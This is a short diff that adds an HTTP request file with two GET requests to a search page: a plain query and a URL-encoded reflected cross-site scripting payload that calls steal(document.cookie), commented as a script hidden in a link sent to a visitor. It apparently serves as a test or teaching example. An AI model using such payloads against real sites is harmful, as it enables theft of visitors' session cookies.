@@ -1,0 +1,5 @@
+GET /search.php?q=Kindred
+
+###
+# A link someone sends to a visitor: the text in it is a script.
+GET /search.php?q=%3Cscript%3Esteal(document.cookie)%3C%2Fscript%3E
